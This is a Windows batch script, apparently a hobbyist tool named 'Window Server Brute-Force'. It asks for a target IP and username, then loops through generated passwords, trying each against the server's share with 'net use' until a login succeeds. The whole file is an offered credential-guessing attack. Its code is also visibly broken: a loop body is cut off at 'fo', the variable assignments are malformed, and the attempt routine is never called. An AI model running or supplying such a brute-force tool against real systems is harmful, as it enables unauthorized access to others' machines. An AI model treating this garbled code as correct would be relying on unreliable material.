@echo off
title Window Server Brute-Force by Pygarg26
color 02
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set maj = A Z E R T Y U I O P Q S D F G H J K L M W X C V B N
set min = a z e r t y u i o p q s d f g h j k l m w x c v b n
set numbers = 1 2 3 4 5 6 7 8 9 0

set /a count=1
set current = none
for %%a in (%maj%) do (
  set current = %%a
	for %%a in (%min%) do (
		set current = %current%%%a
			for %%a in (%min%) do (
				set current = %current%%%a
				for %%a in (%min%) do (
					set current = %current%%%a
					for %%i in (1 1 1 1) do (
						fo
					)
				)
			)
	)
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
